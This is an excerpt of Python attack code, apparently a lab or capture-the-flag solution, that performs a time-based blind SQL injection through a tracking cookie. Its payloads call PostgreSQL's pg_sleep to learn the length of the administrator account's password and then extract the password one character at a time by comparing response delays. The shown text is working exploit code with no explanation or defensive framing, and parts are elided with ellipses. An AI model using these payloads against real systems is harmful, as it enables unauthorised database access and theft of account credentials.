...
def delayed_response(cookie):
	...
	return response.elapsed.total_seconds() > 1

def determine_password_length(tracking_id, session_id):
	password_length = 0
	for i in range(1, 40):
		payload = "'||(SELECT CASE WHEN (LENGTH(password) = {l}) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'".format(l=i)
		payloaded_cookie = make_cookie(tracking_id, session_id, payload)
		if (delayed_response(payloaded_cookie)):
			password_length = i
			break
...
def determine_password(tracking_id, session_id, password_length):
	...
	for i in range(0, password_length):
		...
		while(True):
			...
			payload = "'||(SELECT CASE WHEN (SUBSTRING(password,{i},1) > '{c}') THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'".format(i=i+1,c=c)
			payloaded_cookie = make_cookie(tracking_id, session_id, payload)
			if (delayed_response(payloaded_cookie)):
				if (right_size > 1):
					dt.dict = dt.right
